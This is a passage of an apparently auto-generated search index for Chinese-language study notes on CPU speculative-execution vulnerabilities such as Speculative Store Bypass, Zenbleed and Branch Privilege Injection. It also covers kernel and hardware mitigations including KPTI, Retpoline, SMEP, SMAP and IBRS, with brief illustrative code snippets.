<li>\u200b\u7f13\u89e3\u200b\u63aa\u65bd\u200b\uff1a<ul> <li>\u200b\u5207\u6362\u200b\u7279\u6743\u200b\u7ea7\u200b\u6216\u200b\u5728\u200b\u5bbf\u4e3b\u673a\u200b\u548c\u200b\u865a\u62df\u673a\u200b\u4e4b\u95f4\u200b\u5207\u6362\u200b\u65f6\u200b\uff0c\u200b\u6e05\u7a7a\u200b\u5fae\u200b\u67b6\u6784\u200b\u4e0a\u200b\u7684\u200b\u72b6\u6001\u200b\u4ee5\u200b\u907f\u514d\u200b\u6570\u636e\u200b\u6cc4\u9732\u200b</li> </ul> </li> </ul>"},{"location":"hardware/cpu_vulnerabilities.html#register-file-data-sampling","title":"Register File Data Sampling","text":"<ul> <li>Register File Data Sampling / CVE-2023-28746 / INTEL-SA-00898</li> <li>\u200b\u539f\u7406\u200b\uff1a<ul> <li>\u200b\u5728\u200b\u90e8\u5206\u200b Atom \u200b\u5904\u7406\u5668\u200b\u4e0a\u200b\uff0c<code>VERW</code> \u200b\u6307\u4ee4\u200b\u53ef\u80fd\u200b\u4f1a\u200b\u6cc4\u6f0f\u200b\u6d6e\u70b9\u200b\u5bc4\u5b58\u5668\u200b\u7684\u200b\u65e7\u503c\u200b\uff0c\u200b\u8fd9\u4e2a\u200b\u65e7\u503c\u200b\u53ef\u80fd\u200b\u6765\u81ea\u200b\u5176\u4ed6\u200b\u8fdb\u7a0b\u200b\u6216\u8005\u200b\u5176\u4ed6\u200b\u7279\u6743\u200b\u6001\u200b</li> </ul> </li> <li>\u200b\u7f13\u89e3\u200b\u63aa\u65bd\u200b\uff1a<ul> <li>\u200b\u5347\u7ea7\u200b Microcode</li> <li>\u200b\u4e3b\u52a8\u200b\u6267\u884c\u200b <code>VERW</code> \u200b\u6307\u4ee4\u200b\u6765\u200b\u907f\u514d\u200b\u65e7\u503c\u200b\u88ab\u200b\u540e\u7eed\u200b\u4ee3\u7801\u200b\u6cc4\u6f0f\u200b</li> </ul> </li> </ul>"},{"location":"hardware/cpu_vulnerabilities.html#speculative-store-bypass-ssb","title":"Speculative Store Bypass (SSB)","text":"<ul> <li>Speculative Store Bypass / CVE-2018-3639 / INTEL-SA-00115</li> <li>\u200b\u53c8\u79f0\u200b Spectre Variant 4</li> <li> <p>\u200b\u539f\u7406\u200b\uff1a</p> <ul> <li>\u200b\u5904\u7406\u5668\u200b\u4e3a\u4e86\u200b\u63d0\u5347\u200b load \u200b\u6307\u4ee4\u6027\u200b\u80fd\u200b\uff0c\u200b\u4f1a\u200b\u9884\u6d4b\u200b load \u200b\u6307\u4ee4\u200b\u7684\u200b\u6570\u636e\u200b\u53ef\u4ee5\u200b\u4ece\u200b\u54ea\u6761\u200b store \u200b\u6307\u4ee4\u200b\u83b7\u53d6\u200b</li> <li>\u200b\u5982\u679c\u200b\u6b3a\u9a97\u200b\u8fd9\u4e2a\u200b\u9884\u6d4b\u5668\u200b\uff0c\u200b\u8ba9\u200b\u5b83\u200b\u9884\u6d4b\u200b load\uff08\u200b\u4e0b\u9762\u200b\u7684\u200b <code>Y = ...</code>\uff09\u200b\u4ece\u200b\u9519\u8bef\u200b\u7684\u200b store \u200b\u6307\u4ee4\u200b\u5904\u200b\uff08\u200b\u4e0b\u9762\u200b\u7684\u200b <code>X = &amp;K</code>\uff09\u200b\u83b7\u53d6\u6570\u636e\u200b\uff0c\u200b\u53ef\u4ee5\u200b\u5728\u200b\u4e00\u4e2a\u200b\u63a8\u6d4b\u200b\u6267\u884c\u200b\u7a97\u53e3\u200b\u4e2d\u200b\u64cd\u63a7\u200b load \u200b\u8bfb\u53d6\u200b\u7684\u200b\u6570\u636e\u200b\uff0c\u200b\u8fdb\u800c\u200b\u6cc4\u9732\u200b\u6570\u636e\u200b\uff1a</li> </ul> <p><pre><code>X = &amp;K;    // Attacker manages to get variable with address of K stored into pointer X\n&lt;at some later point&gt;\nX = &amp;M;      // Does a store of address of M to pointer X\nY = Array[*X &amp; 0xFFFF]; // Dereferences address of M which is in pointer X in order to\n      // load from array at index specified by M[15:0]\n</code></pre> - \u200b\u7f13\u89e3\u200b\u63aa\u65bd\u200b\uff1a - \u200b\u6dfb\u52a0\u200b LFENCE \u200b\u4ee5\u200b\u963b\u6b62\u200b\u63a8\u6d4b\u200b\u6267\u884c\u200b - \u200b\u8bbe\u7f6e\u200b Speculative Store Bypass Disable (SSBD)</p> </li> </ul>"},{"location":"hardware/cpu_vulnerabilities.html#zenbleed","title":"Zenbleed","text":"<ul> <li>Zenbleed</li> <li>\u200b\u539f\u7406\u200b\uff1a<ul> <li>\u200b\u90e8\u5206\u200b AMD \u200b\u5904\u7406\u5668\u200b\u5728\u200b\u5904\u7406\u200b\u5411\u91cf\u200b\u5904\u7406\u5668\u200b\u548c\u200b\u5206\u652f\u200b\u9884\u6d4b\u200b\u9519\u8bef\u200b\u6062\u590d\u200b\u65f6\u6709\u200b BUG\uff0c\u200b\u5bfc\u81f4\u200b\u53ef\u80fd\u200b\u4f1a\u200b\u6cc4\u9732\u200b\u5411\u91cf\u200b\u5bc4\u5b58\u5668\u200b\u7684\u200b\u65e7\u503c\u200b</li> </ul> </li> <li>\u200b\u7f13\u89e3\u200b\u63aa\u65bd\u200b\uff1a<ul> <li>\u200b\u5347\u7ea7\u200b Microcode</li> </ul> </li> </ul>"},{"location":"hardware/cpu_vulnerabilities.html#tsx-asynchronous-abort","title":"TSX Asynchronous Abort","text":"<ul> <li>TAA - TSX Asynchronous Abort</li> <li>Intel\u00ae Transactional Synchronization Extensions (Intel\u00ae TSX) Asynchronous Abort / CVE-2019-11135 / INTEL-SA-00270</li> <li>Intel Transactional Synchronization Extensions (TSX) \u200b\u662f\u200b Intel \u200b\u7684\u200b Transactional Memory \u200b\u7684\u200b\u5b9e\u73b0\u200b\uff0c\u200b\u53ef\u4ee5\u200b\u628a\u200b\u4e00\u7cfb\u5217\u200b\u7684\u200b\u6307\u4ee4\u200b\u5f53\u6210\u200b\u4e00\u4e2a\u200b\u4e8b\u52a1\u200b\u539f\u5b50\u200b\u5730\u200b\u5b8c\u6210\u200b</li> <li>\u200b\u539f\u7406\u200b\uff1a<ul> <li>\u200b\u653b\u51fb\u8005\u200b\u542f\u52a8\u200b\u4e00\u4e2a\u200b TSX Transaction\uff0c\u200b\u5f53\u200b\u5b83\u200b\u88ab\u200b\u5f02\u6b65\u200b\u5730\u200b\u6253\u65ad\u200b\u65f6\u200b\uff0c\u200b\u4e00\u4e9b\u200b\u6307\u4ee4\u200b\u4f1a\u200b\u5728\u200b\u63a8\u6d4b\u200b\u6267\u884c\u200b\u8def\u5f84\u200b\u4e0a\u200b\u8bfb\u53d6\u200b\u5230\u200b\u5904\u7406\u5668\u200b\u5185\u90e8\u7ed3\u6784\u200b\u7684\u200b\u503c\u200b\uff0c\u200b\u8fdb\u800c\u200b\u6cc4\u9732\u200b\u4fe1\u606f\u200b</li> </ul> </li> </ul>"},{"location":"hardware/cpu_vulnerabilities.html#special-register-buffer-data-sampling-srbds","title":"Special Register Buffer Data Sampling (SRBDS)","text":"<ul> <li>SRBDS - Special Register Buffer Data Sampling</li> <li>\u200b\u539f\u7406\u200b\uff1a<ul> <li>RDRAND \u200b\u548c\u200b RDSEED \u200b\u6307\u4ee4\u200b\u7684\u200b\u7ed3\u679c\u200b\u4f1a\u200b\u4fdd\u5b58\u200b\u5728\u200b Special Register Buffer \u200b\u5f53\u4e2d\u200b</li> <li>\u200b\u901a\u8fc7\u200b Microarchitectural Data Sampling (MDS) \u200b\u7684\u200b\u65b9\u6cd5\u200b\uff0c\u200b\u53ef\u4ee5\u200b\u6cc4\u9732\u200b\u51fa\u200b Special Register Buffer \u200b\u7684\u200b\u5185\u5bb9\u200b\uff0c\u200b\u4ece\u800c\u200b\u55c5\u200b\u63a2\u5230\u200b\u968f\u673a\u6570\u200b\u751f\u6210\u200b\u6307\u4ee4\u200b\u7684\u200b\u7ed3\u679c\u200b</li> </ul> </li> </ul>"},{"location":"hardware/cpu_vulnerabilities.html#mmio-stale-data","title":"MMIO Stale Data","text":"<ul> <li>Processor MMIO Stale Data Vulnerabilities</li> <li>\u200b\u539f\u7406\u200b\uff1a<ul> <li>\u200b\u5728\u200b\u865a\u62df\u673a\u200b\u4e2d\u200b\u7684\u200b\u653b\u51fb\u8005\u200b\uff0c\u200b\u53ef\u4ee5\u200b\u5bf9\u5916\u200b\u8bbe\u200b\u8fdb\u884c\u200b MMIO\uff0cMMIO \u200b\u7684\u200b\u4e0d\u5f53\u200b\u5b9e\u73b0\u200b\u53ef\u80fd\u200b\u4f1a\u200b\u6cc4\u9732\u200b\u6838\u4e0a\u200b\u5bbf\u4e3b\u673a\u200b\u6216\u200b\u5176\u4ed6\u200b\u865a\u62df\u673a\u200b\u7684\u200b\u6570\u636e\u200b</li> </ul> </li> </ul>"},{"location":"hardware/cpu_vulnerabilities.html#indirect-target-selection","title":"Indirect Target Selection","text":"<ul> <li>CVE-2024-28956</li> <li>Indirect Target Selection / INTEL-SA-01153</li> <li>Training Solo \u200b\u53d1\u73b0\u200b\u7684\u200b\u5176\u4e2d\u200b\u4e00\u4e2a\u200b\u6f0f\u6d1e\u200b</li> <li>\u200b\u539f\u7406\u200b\uff1a<ul> <li>\u200b\u90e8\u5206\u200b Intel \u200b\u7684\u200b CPU \u200b\u6709\u200b BUG\uff0c\u200b\u4f7f\u5f97\u200b\u5728\u200b\u7f13\u5b58\u200b\u884c\u524d\u200b\u534a\u200b\u90e8\u5206\u200b\uff08\u200b\u6839\u636e\u200b\u5206\u652f\u200b\u7684\u200b\u6700\u540e\u200b\u4e00\u4e2a\u200b\u5b57\u8282\u200b\u7684\u200b\u4f4d\u7f6e\u200b\u5224\u65ad\u200b\uff09\u200b\u7684\u200b\u95f4\u63a5\u200b\u5206\u652f\u200b\uff0c\u200b\u5b83\u200b\u7684\u200b\u76ee\u7684\u200b\u5730\u5740\u200b\u53ef\u4ee5\u200b\u88ab\u200b\u9884\u6d4b\u200b\u4e3a\u200b\u7f13\u5b58\u200b\u884c\u540e\u200b\u534a\u200b\u90e8\u5206\u200b\u7684\u200b\u5206\u652f\u200b\u7684\u200b\u76ee\u7684\u200b\u5730\u5740\u200b</li> </ul> </li> <li>\u200b\u7f13\u89e3\u200b\u63aa\u65bd\u200b\uff1a<ul> <li>\u200b\u5fae\u7801\u200b\u66f4\u65b0\u200b</li> <li>\u200b\u628a\u200b\u95f4\u63a5\u200b\u5206\u652f\u200b\u653e\u5230\u200b\u7f13\u5b58\u200b\u884c\u200b\u7684\u200b\u540e\u200b\u534a\u200b\u90e8\u5206\u200b</li> </ul> </li> </ul>"},{"location":"hardware/cpu_vulnerabilities.html#branch-privilege-injection","title":"Branch Privilege Injection","text":"<ul> <li>CVE-2024-45332</li> <li>Branch Privilege Injection</li> <li>\u200b\u539f\u7406\u200b\uff1a<ul> <li>\u200b\u5206\u652f\u200b\u9884\u6d4b\u5668\u200b\u7684\u200b\u66f4\u65b0\u200b\u662f\u200b\u5f02\u6b65\u200b\u7684\u200b\uff0c\u200b\u4ece\u200b\u4e00\u4e2a\u200b\u5206\u652f\u200b\u7684\u200b\u6b63\u786e\u200b\u7ed3\u679c\u200b\u51fa\u6765\u200b\uff0c\u200b\u5230\u200b\u628a\u200b\u7ed3\u679c\u200b\u7528\u4e8e\u200b\u5206\u652f\u200b\u9884\u6d4b\u5668\u200b\u7684\u200b\u8bad\u7ec3\u200b\uff0c\u200b\u9700\u8981\u200b\u82e5\u5e72\u4e2a\u200b\u5468\u671f\u200b</li> <li>\u200b\u5207\u6362\u200b\u7279\u6743\u200b\u6001\u200b\u6216\u8005\u200b\u8fdb\u884c\u200b IBPB\uff08Indirect Branch Prediction Barrier\uff09\u200b\u7684\u200b\u65f6\u5019\u200b\uff0c\u200b\u5f02\u6b65\u200b\u7684\u200b\u66f4\u65b0\u200b\u4f9d\u7136\u200b\u5728\u200b\u8fdb\u884c\u200b\uff0c\u200b\u5bfc\u81f4\u200b\u6709\u200b\u4e00\u4e9b\u200b\u5206\u652f\u200b\u9884\u6d4b\u5668\u200b\u7684\u200b\u66f4\u65b0\u200b\u4ece\u200b\u4e00\u4e2a\u200b\u7279\u6743\u200b\u6001\u200b\u6cc4\u9732\u200b\u5230\u200b\u4e86\u200b\u53e6\u200b\u4e00\u4e2a\u200b\u7279\u6743\u200b\u6001\u200b</li> </ul> </li> <li>\u200b\u7f13\u89e3\u200b\u63aa\u65bd\u200b\uff1a<ul> <li>\u200b\u5fae\u7801\u200b\u66f4\u65b0\u200b</li> </ul> </li> </ul>"},{"location":"hardware/cpu_vulnerabilities.html#mitigations","title":"\u7f13\u89e3\u200b\u63aa\u65bd\u200b Mitigations","text":""},{"location":"hardware/cpu_vulnerabilities.html#kaslr","title":"KASLR","text":"<ul> <li>KASLR: Kernel Address Space Layout Randomization</li> <li>\u200b\u968f\u673a\u5316\u200b\u5185\u6838\u200b\u5730\u5740\u200b\uff0c\u200b\u907f\u514d\u200b\u653b\u51fb\u8005\u200b\u731c\u6d4b\u51fa\u200b\u5185\u6838\u200b\u5730\u5740\u200b</li> </ul>"},{"location":"hardware/cpu_vulnerabilities.html#kernel-page-table-isolation-kptiptikaiser","title":"Kernel Page Table Isolation (KPTI/PTI/KAISER)","text":"<ul> <li>\u200b\u53c8\u79f0\u200b KAISER\uff1a\u200b\u8bba\u6587\u200b KASLR is Dead: Long Live KASLR</li> <li>Page Table Isolation (PTI)</li> <li>\u200b\u5728\u200b\u7528\u6237\u200b\u6001\u200b\u7684\u200b\u9875\u8868\u200b\u91cc\u200b\uff0c\u200b\u4e0d\u8981\u200b\u6620\u5c04\u200b\u6574\u4e2a\u200b\u5185\u6838\u200b\u6001\u200b\u7a7a\u95f4\u200b\uff0c\u200b\u53ea\u200b\u6620\u5c04\u200b\u5fc5\u987b\u200b\u6620\u5c04\u200b\u7684\u200b\u90e8\u5206\u200b\uff0c\u200b\u8fdb\u5165\u200b\u5185\u6838\u200b\u6001\u540e\u200b\uff0c\u200b\u518d\u200b\u5207\u6362\u200b\u5230\u200b\u5177\u6709\u200b\u5b8c\u6574\u200b\u7684\u200b\u5185\u6838\u200b\u6001\u200b\u5730\u5740\u200b\u7a7a\u95f4\u200b\u7684\u200b\u9875\u8868\u200b</li> <li>\u200b\u7279\u522b\u200b\u5730\u200b\uff0cLinux \u200b\u5b9e\u73b0\u200b KPTI \u200b\u7684\u200b\u65f6\u5019\u200b\uff0c\u200b\u5728\u200b\u5185\u6838\u200b\u6001\u200b\u4f7f\u7528\u200b\u7684\u200b\u5b8c\u6574\u200b\u7684\u200b\u9875\u8868\u200b\u91cc\u200b\uff0c\u200b\u7528\u6237\u200b\u6001\u200b\u5730\u5740\u200b\u4f1a\u200b\u88ab\u200b\u6807\u8bb0\u200b\u4e3a\u200b NX\uff0c\u200b\u4e5f\u200b\u5c31\u662f\u200b\u4e0d\u80fd\u200b\u6267\u884c\u200b</li> <li>\u200b\u90a3\u4e48\u200b\u5728\u200b\u7528\u6237\u200b\u6001\u200b\u5c1d\u8bd5\u200b\u8bfb\u53d6\u200b\u5185\u6838\u200b\u6001\u200b\u5730\u5740\u200b\u7684\u200b\u65f6\u5019\u200b\uff0c\u200b\u7531\u4e8e\u200b\u5730\u5740\u200b\u4e0d\u200b\u5728\u200b TLB \u200b\u5f53\u4e2d\u200b\uff0c\u200b\u4e5f\u200b\u5c31\u200b\u65e0\u6cd5\u200b\u8bfb\u53d6\u200b\u5185\u5b58\u200b\uff0c\u200b\u4e0d\u4f1a\u200b\u6cc4\u6f0f\u200b\u6570\u636e\u200b</li> <li>\u200b\u4fee\u590d\u200b Meltdown \u200b\u6f0f\u6d1e\u200b</li> </ul>"},{"location":"hardware/cpu_vulnerabilities.html#retpoline","title":"Retpoline","text":"<ul> <li>Retpoline</li> <li>\u200b\u628a\u200b\u95f4\u63a5\u200b\u5206\u652f\u200b\u66ff\u6362\u200b\u4e3a\u200b call/ret \u200b\u5bf9\u200b\uff0c\u200b\u540c\u65f6\u200b\u628a\u200b\u6808\u200b\u4e0a\u200b\u7684\u200b\u5730\u5740\u200b\u6539\u6210\u200b\u5b9e\u9645\u200b\u7684\u200b\u76ee\u7684\u200b\u5730\u5740\u200b\uff0c\u200b\u5f3a\u8feb\u200b\u786c\u4ef6\u200b\u7528\u200b Return Stack Buffer \u200b\u505a\u200b\u9884\u6d4b\u200b\uff0c\u200b\u4f46\u200b\u7531\u4e8e\u200b\u8986\u76d6\u200b\u4e86\u200b\u8fd4\u56de\u200b\u5730\u5740\u200b\uff0cReturn Stack Buffer \u200b\u603b\u662f\u200b\u4f1a\u200b\u9884\u6d4b\u200b\u9519\u8bef\u200b\uff0c\u200b\u5728\u200b\u9519\u8bef\u200b\u8def\u5f84\u200b\u4e0a\u200b\u5faa\u73af\u200b\u6267\u884c\u200b pause-lfence-jmp \u200b\u4e09\u6761\u200b\u6307\u4ee4\u200b\uff0c\u200b\u4e0d\u4f1a\u200b\u88ab\u200b\u653b\u51fb\u8005\u200b\u63a7\u5236\u200b\uff0c\u200b\u4f46\u4f1a\u200b\u635f\u5931\u200b\u6027\u80fd\u200b</li> <li>\u200b\u9488\u5bf9\u200b\u95f4\u63a5\u200b\u8df3\u8f6c\u200b\uff1a     <pre><code># for indirect jmp:\n# before:\njmp *%rax\n\n# after:\ncall load_label # push the address of capture_ret_spec to the stack\n\ncapture_ret_spec:\npause\nlfence\njmp capture_ret_spec\n\nload_label:\nmov %rax, (%rsp) # override the return address on the top of the stack\nret # the return stack buffer predicts to jump to capture_ret_spec\n</code></pre></li> <li>\u200b\u9488\u5bf9\u200b\u95f4\u63a5\u200b\u8c03\u7528\u200b\uff1a     <pre><code># for indirect call:\n# before:\ncall *%rax\n\n# after:\njmp label2\nlabel0:\n    call label1 # push the address of capture_ret_spec to the stack\n\ncapture_ret_spec:\n    pause\n    lfence\n    jmp capture_ret_spec\n\nlabel1:\n    mov %rax, (%rsp) # override the return address\n    ret\n\nlabel2:\n    call label0 # use extra call to maintain real return address\n    # continue execution\n</code></pre></li> <li>\u200b\u4fee\u590d\u200b\u57fa\u4e8e\u200b\u95f4\u63a5\u200b\u5206\u652f\u200b\u7684\u200b\u6f0f\u6d1e\u200b\uff1aSpectre Variant 2 Branch Target Injection</li> </ul>"},{"location":"hardware/cpu_vulnerabilities.html#supervisor-mode-execution-prevention-smep","title":"Supervisor-Mode Execution Prevention (SMEP)","text":"<ul> <li>Supervisor-Mode Execution Prevention (SMEP) \u200b\u5728\u200b\u5185\u6838\u200b\u6001\u4e0b\u200b\uff0c\u200b\u7981\u6b62\u200b\u8fd0\u884c\u200b\uff08\u200b\u5305\u62ec\u200b\u63a8\u6d4b\u200b\u8fd0\u884c\u200b\uff09\u200b\u7528\u6237\u200b\u6001\u200b\u5730\u5740\u200b\u7a7a\u95f4\u200b\u5185\u200b\u7684\u200b\u4ee3\u7801\u200b\uff0c\u200b\u8fd9\u6837\u200b\u5c31\u200b\u7f29\u5c0f\u200b\u4e86\u200b\u653b\u51fb\u8005\u200b\u53ef\u200b\u5229\u7528\u200b\u7684\u200b\u4ee3\u7801\u200b\u8303\u56f4\u200b</li> <li>\u200b\u53c8\u79f0\u200b Intel\u00ae OS Guard</li> <li>SMEP \u200b\u672c\u8eab\u200b\u4e0d\u80fd\u200b\u4fee\u590d\u200b\u6f0f\u6d1e\u200b\uff0c\u200b\u4f46\u200b\u53ef\u4ee5\u200b\u7ed9\u200b\u653b\u51fb\u8005\u200b\u521b\u9020\u200b\u66f4\u200b\u591a\u200b\u9650\u5236\u200b</li> <li>x86 \u200b\u4e0a\u200b\uff0cSMEP \u200b\u5728\u200b CR4 \u200b\u5bc4\u5b58\u5668\u200b\u4e2d\u200b</li> <li>ARMv8 \u200b\u4e0a\u200b\uff0c\u200b\u8fd9\u4e2a\u200b\u529f\u80fd\u200b\u901a\u8fc7\u200b PXN(Privileged eXecute Never) \u200b\u5b9e\u73b0\u200b\uff0c\u200b\u8bb0\u5f55\u200b\u5728\u200b\u9875\u8868\u200b\u4e2d\u200b</li> </ul>"},{"location":"hardware/cpu_vulnerabilities.html#supervisor-mode-access-prevention-smap","title":"Supervisor-Mode Access Prevention (SMAP)","text":"<ul> <li>Supervisor-Mode Access Prevention (SMAP) \u200b\u5728\u200b\u5185\u6838\u200b\u6001\u4e0b\u200b\uff0c\u200b\u7981\u6b62\u200b\u8bbf\u95ee\u200b\uff08\u200b\u5305\u62ec\u200b\u63a8\u6d4b\u200b\u8bbf\u95ee\u200b\uff09\u200b\u7528\u6237\u200b\u6001\u200b\u7a7a\u95f4\u200b\u7684\u200b\u5185\u5b58\u200b\uff0c\u200b\u7f29\u5c0f\u200b\u653b\u51fb\u8005\u200b\u53ef\u4ee5\u200b\u5229\u7528\u200b\u7684\u200b\u5185\u5b58\u200b\u8303\u56f4\u200b\uff1b\u200b\u4ee3\u4ef7\u200b\u662f\u200b\u5728\u200b\u9700\u8981\u200b\u8bbf\u95ee\u200b\u7528\u6237\u200b\u6001\u200b\u7a7a\u95f4\u200b\u7684\u200b\u5185\u5b58\u200b\u65f6\u200b\uff0c\u200b\u5185\u6838\u200b\u9700\u8981\u200b\u4e34\u65f6\u200b\u5173\u95ed\u200b SMAP</li> <li>SMAP \u200b\u76f8\u5f53\u4e8e\u200b\u662f\u200b\u628a\u200b SMEP \u200b\u7684\u200b\u9650\u5236\u200b\u4ece\u200b\u6267\u884c\u200b\u6743\u9650\u200b\u6269\u5c55\u200b\u5230\u200b\u4e86\u200b\u8bfb\u5199\u200b\u6743\u9650\u200b</li> <li>SMAP \u200b\u672c\u8eab\u200b\u4e0d\u80fd\u200b\u4fee\u590d\u200b\u6f0f\u6d1e\u200b\uff0c\u200b\u4f46\u200b\u53ef\u4ee5\u200b\u7ed9\u200b\u653b\u51fb\u8005\u200b\u521b\u9020\u200b\u66f4\u200b\u591a\u200b\u9650\u5236\u200b</li> <li> <p>x86 \u200b\u4e0a\u200b\uff0c\u200b\u9996\u5148\u200b\u5728\u200b CR4 \u200b\u5bc4\u5b58\u5668\u200b\u4e2d\u200b\u542f\u7528\u200b SMAP\uff0c\u200b\u6b64\u65f6\u200b\u9ed8\u8ba4\u200b\u60c5\u51b5\u200b\u4e0b\u200b\u5185\u6838\u200b\u4e0d\u80fd\u200b\u8bbf\u95ee\u200b\u7528\u6237\u200b\u6001\u200b\u7684\u200b\u6570\u636e\u200b\uff0c\u200b\u53ea\u6709\u200b\u5728\u200b <code>stac</code> \u200b\u6307\u4ee4\u200b\u4e4b\u540e\u200b\u4e14\u200b\u5728\u200b <code>clac</code> \u200b\u6307\u4ee4\u200b\u4e4b\u524d\u200b\u7684\u200b\u533a\u95f4\u200b\u5185\u200b\u53ef\u4ee5\u200b\u8bbf\u95ee\u200b\u7528\u6237\u200b\u6001\u200b\u6570\u636e\u200b\uff1a</p> <p><pre><code># cannot access user pointers\nstac\n# can access user pointers\nclac\n# cannot access user pointers\n</code></pre> - ARMv8 \u200b\u4e0a\u200b\uff0c\u200b\u8fd9\u4e2a\u200b\u529f\u80fd\u200b\u901a\u8fc7\u200b PSTATE.PAN(Privileged Acess Never) \u200b\u5b9e\u73b0\u200b - \u200b\u867d\u7136\u200b\u5185\u6838\u200b\u4e0d\u80fd\u200b\u7528\u200b\u7528\u6237\u200b\u6001\u200b\u7684\u200b\u6307\u9488\u200b\u8bbf\u95ee\u200b\u7528\u6237\u200b\u6001\u200b\u7684\u200b\u6570\u636e\u200b\uff0c\u200b\u4f46\u200b\u7531\u4e8e\u200b Linux \u200b\u4e0b\u200b\u6240\u6709\u200b\u7684\u200b\u7269\u7406\u5730\u5740\u200b\u90fd\u200b\u88ab\u200b\u6620\u5c04\u200b\u5230\u200b\u4e86\u200b\u5185\u6838\u200b\u7684\u200b\u5730\u5740\u200b\u7a7a\u95f4\u200b\uff0c\u200b\u6240\u4ee5\u200b\u5982\u679c\u200b\u53ef\u4ee5\u200b\u83b7\u53d6\u200b\u5230\u200b\u7528\u6237\u200b\u6001\u200b\u7684\u200b\u6307\u9488\u200b\u5bf9\u5e94\u200b\u7684\u200b\u7269\u7406\u5730\u5740\u200b\u5728\u200b\u5185\u6838\u200b\u6001\u4e2d\u200b\u88ab\u200b\u6620\u5c04\u200b\u7684\u200b\u5730\u5740\u200b\uff0c\u200b\u4e5f\u200b\u53ef\u4ee5\u200b\u5728\u200b\u5185\u6838\u200b\u6001\u200b\u8bbf\u95ee\u200b\u5b83\u200b</p> </li> </ul>"},{"location":"hardware/cpu_vulnerabilities.html#bounds-clipping","title":"Bounds Clipping","text":"<ul> <li>\u200b\u8fb9\u754c\u200b\u68c0\u67e5\u200b\u5982\u679c\u200b\u7528\u200b\u6761\u4ef6\u200b\u5206\u652f\u200b\u5b9e\u73b0\u200b\uff0c\u200b\u53ef\u80fd\u200b\u4f1a\u200b\u5728\u200b\u5206\u652f\u200b\u9884\u6d4b\u200b\u7684\u200b\u9519\u8bef\u200b\u8def\u5f84\u200b\u4e0a\u200b\u8bbf\u95ee\u200b\u8fb9\u754c\u200b\u5916\u200b\u7684\u200b\u5185\u5b58\u200b</li> <li>Bounds Clipping \u200b\u4ee5\u200b\u6027\u80fd\u200b\u635f\u5931\u200b\u4e3a\u200b\u4ee3\u4ef7\u200b\uff0c\u200b\u628a\u200b\u8fb9\u754c\u200b\u68c0\u67e5\u200b\u7684\u200b\u6761\u4ef6\u200b\u5206\u652f\u200b\u53d8\u6210\u200b\u8ba1\u7b97\u200b\uff0c\u200b\u4ece\u800c\u200b\u907f\u514d\u200b\u4e86\u200b\u9519\u8bef\u200b\u8def\u5f84\u200b\u7684\u200b\u9884\u6d4b\u200b\u6267\u884c\u200b</li> <li>Linux \u200b\u7684\u200b\u5b9e\u73b0\u200b\uff1a <code>array_index_nospec</code> \u200b\u5b8f\u200b</li> <li>\u200b\u4fee\u590d\u200b Spectre Variant 1 \u200b\u5373\u200b Bounds Check Bypass \u200b\u6f0f\u6d1e\u200b</li> </ul>"},{"location":"hardware/cpu_vulnerabilities.html#indirect-branch-restricted-speculation-ibrs","title":"Indirect Branch Restricted Speculation (IBRS)","text":"<ul> <li>Indirect Branch Restricted Speculation (IBRS)</li> <li>AMD64 TECHNOLOGY INDIRECT BRANCH CONTROL EXTENSION</li> <li>\u200b\u4ece\u200b\u7528\u6237\u200b\u6001\u200b\u5207\u6362\u200b\u5230\u200b\u5185\u6838\u200b\u6001\u540e\u200b\uff0c\u200b\u5728\u200b\u5185\u6838\u200b\u6001\u200b\u8bbe\u7f6e\u200b <code>IA32_SPEC_CTRL.IBRS = 1</code> \u200b\u53ef\u4ee5\u200b\u4fdd\u8bc1\u200b\u5185\u6838\u200b\u6001\u200b\u540e\u7eed\u200b\u95f4\u63a5\u200b\u5206\u652f\u200b\u7684\u200b\u9884\u6d4b\u200b\u4e0d\u4f1a\u200b\u88ab\u200b\u7528\u6237\u200b\u6001\u200b\u5f71\u54cd\u200b</li> <li>\u200b\u53ea\u200b\u4fdd\u62a4\u200b\u4e86\u200b\u95f4\u63a5\u200b\u5206\u652f\u200b\u7684\u200b\u9884\u6d4b\u200b\uff0c\u200b\u4e0d\u200b\u4fdd\u62a4\u200b Return Stack Buffer</li> <li>\u200b\u53ea\u200b\u907f\u514d\u200b\u4e86\u200b\u7528\u6237\u200b\u6001\u5bf9\u200b\u5185\u6838\u200b\u6001\u200b\u7684\u200b\u95f4\u63a5\u200b\u9884\u6d4b\u5668\u200b\u7684\u200b\u5f71\u54cd\u200b\uff0c\u200b\u4f46\u200b\u4e0d\u540c\u200b\u7528\u6237\u200b\u6001\u200b\u8fdb\u7a0b\u200b\u95f4\u200b\uff08\u200b\u5305\u62ec\u200b\u865a\u62df\u673a\u200b\u4e4b\u95f4\u200b\uff09\u200b\u8fd8\u662f\u200b\u4f1a\u200b\u4e92\u76f8\u200b\u5f71\u54cd\u200b</li> <li>IBRS \u200b\u5305\u62ec\u200b\u4e86\u200b STIBP \u200b\u7684\u200b\u529f\u80fd\u200b\uff1a\u200b\u5982\u679c\u200b\u5f00\u542f\u200b\u4e86\u200b IBRS\uff0c\u200b\u90a3\u4e48\u200b\u540c\u4e00\u4e2a\u200b\u7269\u7406\u200b\u6838\u200b\u7684\u200b\u4e24\u4e2a\u200b\u903b\u8f91\u200b\u6838\u200b\u4e4b\u95f4\u200b\u7684\u200b\u95f4\u63a5\u200b\u5206\u652f\u200b\u9884\u6d4b\u5668\u200b\u4e5f\u200b\u4f1a\u200b\u88ab\u200b\u9694\u79bb\u200b</li> <li>\u200b\u6b64\u5916\u200b IBRS \u200b\u8fd8\u4f1a\u200b\u4fdd\u8bc1\u200b\u5185\u6838\u200b\u6001\u200b\u548c\u200b Enclave \u200b\u4ee5\u53ca\u200b SMM\uff08System Management Mode\uff09\u200b\u4e4b\u95f4\u200b\u7684\u200b\u9694\u79bb\u200b\uff0c\u200b\u5728\u200b Linux \u200b\u91cc\u200b\u79f0\u200b\u8fd9\u4e2a\u200b\u529f\u80fd\u200b\u4e3a\u200b IBRS_FW\uff0c\u200b\u8868\u793a\u200b\u5bf9\u200b\u56fa\u4ef6\u200b\u7684\u200b\u4fdd\u62a4\u200b</li> <li>\u200b\u4fee\u590d\u200b\u57fa\u4e8e\u200b\u95f4\u63a5\u200b\u5206\u652f\u200b\u7684\u200b\u6f0f\u6d1e\u200b\uff1aSpectre Variant 2 Branch Target Injection</li> </ul>"},{"location":"hardware/cpu_vulnerabilities.html#enhanced-indirect-branch-restricted-speculation-enhanced-ibrseibrs","title":"Enhanced Indirect Branch Restricted Speculation (Enhanced IBRS/eIBRS)","text":"<ul> <li>Indirect Branch Restricted Speculation (IBRS) 